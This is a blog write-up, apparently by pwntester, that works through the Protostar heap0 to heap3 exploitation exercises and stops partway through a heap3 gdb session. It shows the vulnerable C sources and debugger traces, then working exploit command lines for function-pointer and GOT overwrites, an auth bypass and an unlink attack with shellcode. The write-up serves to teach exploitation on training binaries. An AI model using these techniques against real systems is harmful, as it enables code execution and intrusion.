@@ -1,0 +1,753 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Protostar heap0-4 write-ups</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="Heap0 In Heap0 we are given the following vulnerable code:
+#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; struct data { char name[64]; }; struct fp { int (*fp)(); }; void winner() { printf(&amp;quot;level passed\n&amp;quot;); } void nowinner() { printf(&amp;quot;level has not been passed\n&amp;quot;); } int main(int argc, char **argv) { struct data *d; struct fp *f; d = malloc(sizeof(struct data)); f = malloc(sizeof(struct fp)); f-&amp;gt;fp = nowinner; printf(&amp;quot;data is at %p, fp is at %p\n&amp;quot;, d, f); strcpy(d-&amp;gt;name, argv[1]); f-&amp;gt;fp(); }  From a quick peek to the source code, we can see that our first argument can overflow the d-&amp;gt;name buffer (64bytes) and so overwrite the f-&amp;gt;fp pointer.">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="Protostar heap0-4 write-ups">
+    <meta name="twitter:description" content="Heap0 In Heap0 we are given the following vulnerable code:
+#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; struct data { char name[64]; }; struct fp { int (*fp)(); }; void winner() { printf(&amp;quot;level passed\n&amp;quot;); } void nowinner() { printf(&amp;quot;level has not been passed\n&amp;quot;); } int main(int argc, char **argv) { struct data *d; struct fp *f; d = malloc(sizeof(struct data)); f = malloc(sizeof(struct fp)); f-&amp;gt;fp = nowinner; printf(&amp;quot;data is at %p, fp is at %p\n&amp;quot;, d, f); strcpy(d-&amp;gt;name, argv[1]); f-&amp;gt;fp(); }  From a quick peek to the source code, we can see that our first argument can overflow the d-&amp;gt;name buffer (64bytes) and so overwrite the f-&amp;gt;fp pointer.">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Protostar heap0-4 write-ups">
+  <meta property="og:description" content="Heap0 In Heap0 we are given the following vulnerable code:
+#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; struct data { char name[64]; }; struct fp { int (*fp)(); }; void winner() { printf(&amp;quot;level passed\n&amp;quot;); } void nowinner() { printf(&amp;quot;level has not been passed\n&amp;quot;); } int main(int argc, char **argv) { struct data *d; struct fp *f; d = malloc(sizeof(struct data)); f = malloc(sizeof(struct fp)); f-&amp;gt;fp = nowinner; printf(&amp;quot;data is at %p, fp is at %p\n&amp;quot;, d, f); strcpy(d-&amp;gt;name, argv[1]); f-&amp;gt;fp(); }  From a quick peek to the source code, we can see that our first argument can overflow the d-&amp;gt;name buffer (64bytes) and so overwrite the f-&amp;gt;fp pointer.">
+  <meta property="og:url" content="http://pwntester.com/blog/2013/12/20/protostar-heap0-4-write-ups/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2013/12/20/protostar-heap0-4-write-ups/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Protostar heap0-4 write-ups</h1>
+      <p class="post-meta">@pwntester · Dec 20, 2013 · 12 min read</p>
+    </header>
+    <article class="post-content">
+
+<h2 id="heap0">Heap0</h2>
+
+<p>In <a href="http://www.exploit-exercises.com/protostar/heap0">Heap0</a> we are given the following vulnerable code:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+
+struct data {
+  char name[64];
+};
+
+struct fp {
+  int (*fp)();
+};
+
+void winner()
+{
+  printf(&quot;level passed\n&quot;);
+}
+
+void nowinner()
+{
+  printf(&quot;level has not been passed\n&quot;);
+}
+
+int main(int argc, char **argv)
+{
+  struct data *d;
+  struct fp *f;
+
+  d = malloc(sizeof(struct data));
+  f = malloc(sizeof(struct fp));
+  f-&gt;fp = nowinner;
+
+  printf(&quot;data is at %p, fp is at %p\n&quot;, d, f);
+
+  strcpy(d-&gt;name, argv[1]);
+
+  f-&gt;fp();
+
+}
+</code></pre>
+
+<p>From a quick peek to the source code, we can see that our first argument can overflow the d-&gt;name buffer (64bytes) and so overwrite the f-&gt;fp pointer.</p>
+
+<p>If we run the program with <strong>ltrace</strong> we will be able to analyze <strong>malloc</strong> calls:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ ltrace /opt/protostar/bin/heap0 `perl -e 'print &quot;A&quot;*64'`
+__libc_start_main(0x804848c, 2, 0xbffff874, 0x8048520, 0x8048510 &lt;unfinished ...&gt;
+malloc(64)                                                                                    = 0x0804a008
+malloc(4)                                                                                     = 0x0804a050
+printf(&quot;data is at %p, fp is at %p\n&quot;, 0x804a008, 0x804a050data is at 0x804a008, fp is at 0x804a050
+)                                  = 41
+strcpy(0x0804a008, &quot;0&quot;)                                                                       = 0x0804a008
+puts(&quot;level has not been passed&quot;level has not been passed
+)                                                             = 26
++++ exited (status 26) +++
+</code></pre>
+
+<p>Ok, so the f-&gt;fp address is <strong>0x0804a050</strong> and the beginning of our d-&gt;data buffer is at <strong>0x0804a008</strong>. So if we fill d-&gt;data with 72 bytes  (0x0804a050 - 0x0804a008) the next 4 bytes will overwrite f-&gt;fp</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ gdb -q /opt/protostar/bin/heap0
+Reading symbols from /opt/protostar/bin/heap0...done.
+(gdb) run `perl -e 'print &quot;A&quot;x72 .&quot;BBBB&quot;'`
+Starting program: /opt/protostar/bin/heap0 `perl -e 'print &quot;A&quot;x72 .&quot;BBBB&quot;'`
+data is at 0x804a008, fp is at 0x804a050
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+</code></pre>
+
+<p>Nice!, lets use our winner address:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ objdump -t /opt/protostar/bin/heap0 | grep winner
+08048464 g     F .text	00000014              winner
+08048478 g     F .text	00000014              nowinner
+</code></pre>
+
+<p>and &hellip;</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ /opt/protostar/bin/heap0 `perl -e 'print &quot;A&quot;x72 .&quot;\x64\x84\x04\x08&quot;'`
+data is at 0x804a008, fp is at 0x804a050
+level passed
+</code></pre>
+
+<h2 id="heap1">Heap1</h2>
+
+<p>In <a href="http://www.exploit-exercises.com/protostar/heap1">Heap1</a> we are given the following vulnerable code:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+
+
+
+struct internet {
+  int priority;
+  char *name;
+};
+
+void winner()
+{
+  printf(&quot;and we have a winner @ %d\n&quot;, time(NULL));
+}
+
+int main(int argc, char **argv)
+{
+  struct internet *i1, *i2, *i3;
+
+  i1 = malloc(sizeof(struct internet));
+  i1-&gt;priority = 1;
+  i1-&gt;name = malloc(8);
+
+  i2 = malloc(sizeof(struct internet));
+  i2-&gt;priority = 2;
+  i2-&gt;name = malloc(8);
+
+  strcpy(i1-&gt;name, argv[1]);
+  strcpy(i2-&gt;name, argv[2]);
+
+  printf(&quot;and that's a wrap folks!\n&quot;);
+}
+</code></pre>
+
+<p>Ok, lets run a &ldquo;lets be good guys&rdquo; run with ltrace and expected arguments (8 bytes per name):</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ ltrace /opt/protostar/bin/heap1 AAAAAAAA BBBBBBBB
+__libc_start_main(0x80484b9, 3, 0xbffff864, 0x8048580, 0x8048570 &lt;unfinished ...&gt;
+malloc(8)                                                                                     = 0x0804a008
+malloc(8)                                                                                     = 0x0804a018
+malloc(8)                                                                                     = 0x0804a028
+malloc(8)                                                                                     = 0x0804a038
+strcpy(0x0804a018, &quot;AAAAAAAA&quot;)                                                                = 0x0804a018
+strcpy(0x0804a038, &quot;BBBBBBBB&quot;)                                                                = 0x0804a038
+puts(&quot;and that's a wrap folks!&quot;and that's a wrap folks!
+)                                                              = 25
++++ exited (status 25) +++
+</code></pre>
+
+<p>Lets make some sense of all those mallocs:</p>
+
+<p>internet1 at 0x0804a008 (size 8)
+&ndash;&gt; internet1.priority at 0x0804a008 (size 4)
+&ndash;&gt; internet1.name at 0x0804a00c (size 4)
+&mdash;-&gt; memory area pointed by internet1.name at 0x0804a018 (size 8)
+internet2 at 0x0804a028 (size 8)
+&ndash;&gt; internet2.priority at 0x0804a028 (size 4)
+&ndash;&gt; internet2.name at 0x0804a02c (size 4)
+&mdash;-&gt; memory area pointed by internet2.name at 0x0804a038 (size 8)</p>
+
+<p>So with our A payload we could easily overwite internet2.priority, internet2.name and memory area pointed by internet2.name.
+Our B payload will be written to the address stored in <strong>internet2.name</strong> by default this address points to the value returned by the last malloc call: 0x0804a038 but we can overwrite it with our A payload.
+Thats pretty nice, we can write any arbitrary content (B payload) in any arbitrary address (controlled by A payload). All we have to do is replace the GOT entry for the <strong>puts</strong> call we saw in the ltrace output, so when it gets executed, we can execute another function instead.</p>
+
+<p>Lets find <strong>winner</strong> address:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ objdump -t /opt/protostar/bin/heap1 | grep winner
+08048494 g     F .text	00000025              winner
+</code></pre>
+
+<p>and the <strong>puts</strong> entry in GOT:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ objdump -TR /opt/protostar/bin/heap1 | grep puts
+00000000      DF *UND*	00000000  GLIBC_2.0   puts
+08049774 R_386_JUMP_SLOT   puts
+</code></pre>
+
+<p>And now lets do some maths and build our payload:</p>
+
+<p>A payload: Ax(0x0804a02c - 0x0804a018) + &ldquo;\x74\x97\x04\x08&rdquo; = &ldquo;A&rdquo;x 20 . &ldquo;\x74\x97\x04\x08&rdquo;
+B payload: &ldquo;\x94\x84\x04\x08&rdquo;</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ /opt/protostar/bin/heap1 `perl -e 'print &quot;A&quot;x20 .&quot;\x74\x97\x04\x08&quot;'` `perl -e 'print &quot;\x94\x84\x04\x08&quot;'`
+and we have a winner @ 1387538886
+</code></pre>
+
+<p>Nice, lets check the internals with <strong>ltrace</strong>:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ ltrace /opt/protostar/bin/heap1 `perl -e 'print &quot;A&quot;x20 .&quot;\x74\x97\x04\x08&quot;'` `perl -e 'print &quot;\x94\x84\x04\x08&quot;'`
+__libc_start_main(0x80484b9, 3, 0xbffff854, 0x8048580, 0x8048570 &lt;unfinished ...&gt;
+malloc(8)                                                                                     = 0x0804a008
+malloc(8)                                                                                     = 0x0804a018
+malloc(8)                                                                                     = 0x0804a028
+malloc(8)                                                                                     = 0x0804a038
+strcpy(0x0804a018, &quot;AAAAAAAAAAAAAAAAAAAAt\227\004\b&quot;)                                         = 0x0804a018
+strcpy(0x08049774, &quot;\224\204\004\b&quot;)                                                          = 0x08049774
+puts(&quot;and that's a wrap folks!&quot; &lt;unfinished ...&gt;
+time(NULL)                                                                                    = 1387538870
+printf(&quot;and we have a winner @ %d\n&quot;, 1387538870and we have a winner @ 1387538870
+)                                             = 34
+&lt;... puts resumed&gt; )                                                                          = 34
++++ exited (status 34) +++
+</code></pre>
+
+<p>We can see that we sucessfully overwrote the strcpy destination address. Voila!!</p>
+
+<h2 id="heap2">Heap2</h2>
+
+<p>In <a href="http://www.exploit-exercises.com/protostar/heap2">Heap2</a> we are given the following vulnerable code:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
+
+struct auth {
+  char name[32];
+  int auth;
+};
+
+struct auth *auth;
+char *service;
+
+int main(int argc, char **argv)
+{
+  char line[128];
+
+  while(1) {
+    printf(&quot;[ auth = %p, service = %p ]\n&quot;, auth, service);
+
+    if(fgets(line, sizeof(line), stdin) == NULL) break;
+
+    if(strncmp(line, &quot;auth &quot;, 5) == 0) {
+      auth = malloc(sizeof(auth));
+      memset(auth, 0, sizeof(auth));
+      if(strlen(line + 5) &lt; 31) {
+        strcpy(auth-&gt;name, line + 5);
+      }
+    }
+    if(strncmp(line, &quot;reset&quot;, 5) == 0) {
+      free(auth);
+    }
+    if(strncmp(line, &quot;service&quot;, 6) == 0) {
+      service = strdup(line + 7);
+    }
+    if(strncmp(line, &quot;login&quot;, 5) == 0) {
+      if(auth-&gt;auth) {
+        printf(&quot;you have logged in already!\n&quot;);
+      } else {
+        printf(&quot;please enter your password\n&quot;);
+      }
+    }
+  }
+}
+</code></pre>
+
+<p>Ok, I have no clue where to begin with :) so I just run it on <strong>ltrace</strong> to see if I see something suspicious. I run &ldquo;auth alvaro&rdquo; and &ldquo;service&rdquo;:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ ltrace /opt/protostar/bin/heap2
+__libc_start_main(0x8048934, 1, 0xbffff874, 0x804acc0, 0x804acb0 &lt;unfinished ...&gt;
+printf(&quot;[ auth = %p, service = %p ]\n&quot;, (nil), (nil)[ auth = (nil), service = (nil) ]
+)                                         = 34
+fgets(auth alvaro
+&quot;auth alvaro\n&quot;, 128, 0xb7fd8420)                                                       = 0xbffff740
+strncmp(&quot;auth alvaro\n&quot;, &quot;auth &quot;, 5)                                                          = 0
+sysconf(30, 0, 0xb7fe1b28, 1, 0)                                                              = 4096
+sbrk(4096)                                                                                    = 0x0804c000
+sbrk(0)                                                                                       = 0x0804d000
+memset(0x0804c008, '\000', 4)                                                                 = 0x0804c008
+strlen(&quot;alvaro\n&quot;)                                                                            = 7
+strcpy(0x0804c008, &quot;alvaro\n&quot;)                                                                = 0x0804c008
+strncmp(&quot;auth alvaro\n&quot;, &quot;reset&quot;, 5)                                                          = -17
+strncmp(&quot;auth alvaro\n&quot;, &quot;service&quot;, 6)                                                        = -18
+strncmp(&quot;auth alvaro\n&quot;, &quot;login&quot;, 5)                                                          = -11
+printf(&quot;[ auth = %p, service = %p ]\n&quot;, 0x804c008, (nil)[ auth = 0x804c008, service = (nil) ]
+)                                     = 38
+fgets(service
+&quot;service\n&quot;, 128, 0xb7fd8420)                                                           = 0xbffff740
+strncmp(&quot;service\n&quot;, &quot;auth &quot;, 5)                                                              = 18
+strncmp(&quot;service\n&quot;, &quot;reset&quot;, 5)                                                              = 1
+strncmp(&quot;service\n&quot;, &quot;service&quot;, 6)                                                            = 0
+strdup(&quot;\n&quot;)                                                                                  = 0x0804c018
+strncmp(&quot;service\n&quot;, &quot;login&quot;, 5)                                                              = 7
+printf(&quot;[ auth = %p, service = %p ]\n&quot;, 0x804c008, 0x804c018[ auth = 0x804c008, service = 0x804c018 ]
+)                                 = 42
+fgets(
+</code></pre>
+
+<p>Ok, first thing weird is that <strong>memset</strong> call is just for 4 bytes!! wait, the source is not allocating the size of the struct but the size of the pointer thats 4 bytes!
+So we have a 4 bytes space in the heap containing the address of the auth pointer. This heap space is at 0x0804c008
+Now the <strong>strcpy(0x0804c008, &ldquo;alvaro\n&rdquo;)</strong> is not copying to auth struct but overwriting the struct address in the heap
+From the output of the service command we can see that the argument to the service command is allocated at <strong>0x804c018</strong> that is 16 bytes above the auth space.</p>
+
+<p>Now in the login bit of the program, we are using <strong>auth-&gt;auth</strong> but auth is not the struct is the pointer to the struct!! Anyway, the compiler will cast it to the struct and so it will look for the <strong>auth</strong> member 32 bytes above the beggining of the &ldquo;struct&rdquo; (really the address of the auth pointer address)</p>
+
+<p>We can use the auth command argument to write the auth pointer address
+We can use the service command argument to write anything to <strong>0x804c018</strong></p>
+
+<p>So we want to place anything but a 0 32 bytes above <strong>0x804c008</strong>. We cannot use the argument to the auth command since it is controlled but we can use the argument to the service command.
+Writing any string longer than 16 bytes (auth int offset within the auth struct - <strong>0x804c018</strong> - <strong>0x804c008</strong>) will be enough</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ /opt/protostar/bin/heap2
+[ auth = (nil), service = (nil) ]
+auth alvaro
+[ auth = 0x804c008, service = (nil) ]
+service AAAAAAAAAAAAAAAAB
+[ auth = 0x804c008, service = 0x804c018 ]
+login
+you have logged in already!
+[ auth = 0x804c008, service = 0x804c018 ]
+</code></pre>
+
+<h2 id="heap3">Heap3</h2>
+
+<p>In <a href="http://www.exploit-exercises.com/protostar/heap3">Heap3</a> we are given the following vulnerable code:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
+
+void winner()
+{
+  printf(&quot;that wasn't too bad now, was it? @ %d\n&quot;, time(NULL));
+}
+
+int main(int argc, char **argv)
+{
+  char *a, *b, *c;
+
+  a = malloc(32);
+  b = malloc(32);
+  c = malloc(32);
+
+  strcpy(a, argv[1]);
+  strcpy(b, argv[2]);
+  strcpy(c, argv[3]);
+
+  free(c);
+  free(b);
+  free(a);
+
+  printf(&quot;dynamite failed?\n&quot;);
+}
+</code></pre>
+
+<p>This example looks like a classic vulnerable <strong>unlink</strong> scenario where we can override a chunk of memory an fool free() to call unlink() on it but the memory chunks are freed in the reverse order and we will need to pay special attention.
+I recommend you to get familiar with how the heap works and what happens once we call <strong>free</strong>. Some good references :</p>
+
+<ul>
+<li><a href="http://www.phrack.org/issues.html?issue=57&amp;id=8&amp;mode=txt">Vudo Malloc Tricks by MaXX</a></li>
+<li><a href="https://www.thc.org/root/docs/exploit_writing/Exploiting%20the%20wilderness.txt">Exploiting the Wilderness by Phantasmal Phantasmagoria</a></li>
+<li><a href="http://www.win.tue.nl/~aeb/linux/hh/hh-11.html">Exploiting the heap</a></li>
+</ul>
+
+<p>When <strong>free&copy;</strong> is called, it will detect that the memory before (&ldquo;b&rdquo;) is in use and the memory after is the <strong>wilderness</strong> (cool name, uh?) so it will just expand the wilderness to take &ldquo;<strong>c</strong>&ldquo;
+When <strong>free(b)</strong> is called, it will detect the same scenario but there is a chance for us to fool free() into calling the <strong>unlink</strong> macro on the previous chunk of code.
+The idea is that when freeing &ldquo;<strong>b</strong>&rdquo;&rdquo; the free() algorithm will check if the chunk before &ldquo;<strong>b</strong>&rdquo;&rdquo; is free and if so, it will unlink it and merge it with &ldquo;<strong>b</strong>&rdquo; and the wilderness. Otherwise, merging just &ldquo;<strong>b</strong>&rdquo; and the wilderness without checking &ldquo;<strong>a</strong>&rdquo; can lead to leave a free chunk just before the wilderness &hellip; and that makes no sense.</p>
+
+<p>So we need to fool free(b) into thinking that &ldquo;<strong>a</strong>&rdquo; is free so that free() will unlink it and merge it with the chunk being freed (<strong>b</strong>) before linking the merged block again into &ldquo;<strong>bin</strong>&rdquo;.</p>
+
+<p>In order to do that we will modify <strong>b</strong>&rsquo;s headers so that:
+size = anything with <strong>PREV_IN_USE</strong> not set and big enough to hold our payload</p>
+
+<p>This way the free() algorithm will think that <strong>a</strong> is free but we cannot overwrite <strong>a</strong>&rsquo;s headers to modify its <strong>bk</strong> and <strong>fd</strong> pointers and get arbitrary code execution :(
+Lets see if we can fool free() again to unlink a different portion of memory (instead of &ldquo;<strong>a</strong>&rdquo;).</p>
+
+<p>In order to calculate &ldquo;<strong>a</strong>&rdquo; address, free() will use <strong>b</strong>&rsquo;s prev_size so that:
+&amp;a = &amp;b - b_prev_size</p>
+
+<p>We can overwrite <strong>b</strong>&rsquo;s prev_size and set a negative number like -4 so that free() will try to unlink &amp;b-(-4) = &amp;b + 4. All we need to do is placing a fake chunk there.</p>
+
+<p>We need to write our fake *fd and *bk pointers at that offset (because &amp;b does not point to the prev_size or size headers, but to the beggining of *fd). In order to redirect program execution we need to set his *fd and *bk in the following way (omiting how we get GOT and winner address since it has been shown on previous write-ups):</p>
+
+<p>fd = (address to write on -12) = GOT entry for puts - 12 = 0x0804b128 - 12 = <strong>0x0804b11c</strong>
+bk = (content to write on [fd + 12]) = &amp;winner = <strong>0x08048864</strong></p>
+
+<p>Ok, now we have everything we needed, lets craft the argv payloads</p>
+
+<p>argv[1]:
+a_data + b_prev_size + b_size
+&ldquo;A&rdquo;x32 + (-4) + (!PREV_IN_USE)
+&ldquo;A&rdquo;x32 . &ldquo;\xfc\xff\xff\xff&rdquo; . &ldquo;\xf0\xff\xff\xff&rdquo;</p>
+
+<p>argv[2]:
+4bytes_offset + fake-&gt;fd + fake-bk
+&ldquo;BBBB&rdquo; + 0x0804b11c + 0x08048864
+&ldquo;BBBB&rdquo; . &ldquo;\x1c\xb1\x04\x08&rdquo; . &ldquo;\x64\x88\x04\x08&rdquo;</p>
+
+<p>argv[2]:
+c_data
+&ldquo;CCCC&rdquo;</p>
+
+<p>Payload:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ /opt/protostar/bin/heap3 `python -c 'print &quot;A&quot;*32 + &quot;\xfc\xff\xff\xff&quot; + &quot;\xfc\xff\xff\xff&quot;'` `python -c 'print &quot;BBBB&quot; + &quot;\x1c\xb1\x04\x08&quot; + &quot;\x64\x88\x04\x08&quot;'` CCCC
+Segmentation fault
+</code></pre>
+
+<p>Damn it!! Lets have a look with gdb:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ gdb -q /opt/protostar/bin/heap3
+Reading symbols from /opt/protostar/bin/heap3...done.
+(gdb) run `python -c 'print &quot;A&quot;*32 + &quot;\xfc\xff\xff\xff&quot; + &quot;\xfc\xff\xff\xff&quot;'` `python -c 'print &quot;BBBB&quot; + &quot;\x1c\xb1\x04\x08&quot; + &quot;\x64\x88\x04\x08&quot;'` CCCC
+Starting program: /opt/protostar/bin/heap3 `python -c 'print &quot;A&quot;*32 + &quot;\xfc\xff\xff\xff&quot; + &quot;\xfc\xff\xff\xff&quot;'` `python -c 'print &quot;BBBB&quot; + &quot;\x1c\xb1\x04\x08&quot; + &quot;\x64\x88\x04\x08&quot;'` CCCC
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08049906 in free (mem=0x804c030) at common/malloc.c:3638
+3638	common/malloc.c: No such file or directory.
+	in common/malloc.c
+(gdb) x/x 0x0804b128
+0x804b128 &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:	0x08048864
+(gdb) p winner
+$1 = {void (void)} 0x8048864 &lt;winner&gt;
+</code></pre>
+
+<p>As you can see we have successfully overwritten the GOT entry for <strong>puts()</strong> with the winner address but we have a segmentation fault within malloc.c</p>
+
+<p>Lets try an alternative approach. Instead of jumping straight to the winner address, we will prepare a shellcode that will get there for us and we will place this shellcode in the first chunk.</p>
+
+<p>Shellcode:
+jmp 12
+nop sled
+push &amp;winner
+ret</p>
+
+<p>or in opcodes:
+\xeb\x0c\x90..\x90\xeb\x0c\x68\x64\x88\x04\x08\xc3</p>
+
+<p>We want to jump 12 bytes because unlink will overwrite part of our shellcode.</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ /opt/protostar/bin/heap3 `python -c 'print &quot;\xeb\x0c&quot; + \x90&quot;*18 + &quot;\x68\x64\x88\x04\x08\xc3&quot; + &quot;A&quot;*6 + &quot;\xfc\xff\xff\xff&quot; + &quot;\xfc\xff\xff\xff&quot;'` `python -c 'print &quot;BBBB&quot;+&quot;\x1c\xb1\x04\x08&quot;+&quot;\x08\xc0\x04\x08&quot;'` CCCC
+that wasn't too bad now, was it? @ 1387564812
+</code></pre>
+
+<p>Wow, it worked!</p>
+
+<p>If we set up a breakpoint in winner function, we can check that puts() GOT entry has been overwritten successfully:</p>
+
+<pre><code class="language-lang-bash">(gdb) b *winner
+Breakpoint 1 at 0x8048864: file heap3/heap3.c, line 8.
+(gdb) run `python -c 'print &quot;\xeb\x0c&quot; + &quot;\x90&quot;*18 + &quot;\x68\x64\x88\x04\x08\xc3&quot; + &quot;A&quot;*6 + &quot;\xfc\xff\xff\xff&quot; + &quot;\xfc\xff\xff\xff&quot;'` `python -c 'print &quot;BBBB&quot;+&quot;\x1c\xb1\x04\x08&quot;+&quot;\x08\xc0\x04\x08&quot;'` CCCC
+Starting program: /opt/protostar/bin/heap3 `python -c 'print &quot;\xeb\x0c&quot; + &quot;\x90&quot;*18 + &quot;\x68\x64\x88\x04\x08\xc3&quot; + &quot;A&quot;*6 + &quot;\xfc\xff\xff\xff&quot; + &quot;\xfc\xff\xff\xff&quot;'` `python -c 'print &quot;BBBB&quot;+&quot;\x1c\xb1\x04\x08&quot;+&quot;\x08\xc0\x04\x08&quot;'` CCCC
+
+Breakpoint 1, winner () at heap3/heap3.c:8
+8	heap3/heap3.c: No such file or directory.
+	in heap3/heap3.c
+(gdb) x/x 0x0804b128
